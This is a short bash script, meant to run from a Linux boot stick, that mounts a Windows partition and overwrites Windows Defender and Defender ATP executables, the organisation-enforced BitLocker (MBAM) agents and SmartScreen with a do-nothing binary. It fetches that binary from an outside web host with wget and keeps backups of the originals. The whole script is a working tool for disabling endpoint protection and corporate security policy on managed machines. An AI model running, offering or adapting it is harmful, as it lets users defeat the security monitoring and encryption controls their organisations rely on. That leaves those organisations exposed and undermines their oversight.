#!/bin/bash
# This script must be launched in linux OS (usually installed in usb stick), 
#   to fuck windows defender and organization bitlocker.
# How to shutdown windows: 
# 1. turn off quick restart
# 2. powercfg -h off
# 3. shutdown /s /t 0

[[ "$1" = "" ]] && echo "Usage: $0 <windows_install_device>. Example: ./fuck-outside.sh /dev/sdb2" && exit 1

devName="$1"
tmpDir="/tmp/fuck-outside.tmp.mount"
nothingExe="/tmp/nothing.win64.exe"

function fuck_file () {
    fl="$1"
    echo "Fucking $fl ..."
    [[ -f "$fl.winfuck.backup" ]] && echo "Already fucked. skipping..." && return 0
    cp "$fl" "$fl.winfuck.backup" && cp "$nothingExe" "$fl"
    return $?
}

function find_and_fuck () {
    IFS=$'\n'
    # Windows Defender
    #MS will fuck you if you fuck him# fuck_file "$tmpDir/Program Files/Windows Defender Advanced Threat Protection/MsSense.exe"
    fuck_file "$tmpDir/Program Files/Windows Defender Advanced Threat Protection/SenseNdr.exe"
    for f in `find "$tmpDir/ProgramData/Microsoft/Windows Defender/Platform" -name 'MsMpEng.exe'`; do
        fuck_file "$f"
    done

    # Organizaiton enforced bitlocker
    fuck_file "$tmpDir/Program Files/Microsoft/MDOP MBAM/MBAMClientUI.exe"
    fuck_file "$tmpDir/Program Files/Microsoft/MDOP MBAM/MBAMAgent.exe"
    # you may still need to delete the whole folder, and create a file there, and disable inheritance to prevent anyone to delete it. 

    # Alter this file with donothing.exe will cause problem. Removing it directly is ok. 
    mv "$tmpDir/Windows/System32/smartscreen.exe" "$tmpDir/Windows/System32/smartscreen.exe.backup"
}

wget https://recolic.cc/setup/win/nothing.win64.exe -O "$nothingExe" &&
    mkdir "$tmpDir" &&
    mount "$devName" "$tmpDir" &&
    find_and_fuck




